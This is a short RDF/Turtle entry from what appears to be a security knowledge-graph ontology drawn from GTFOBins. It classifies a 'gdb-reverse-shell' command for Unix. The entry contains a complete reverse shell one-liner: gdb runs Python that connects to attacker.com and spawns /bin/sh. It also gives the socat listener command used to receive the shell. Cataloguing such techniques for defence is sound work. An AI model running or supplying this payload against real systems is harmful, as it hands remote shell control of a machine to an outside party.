mknd:command_gdb-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "gdb-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_gdb ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_gdb ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' -ex quit
""" .

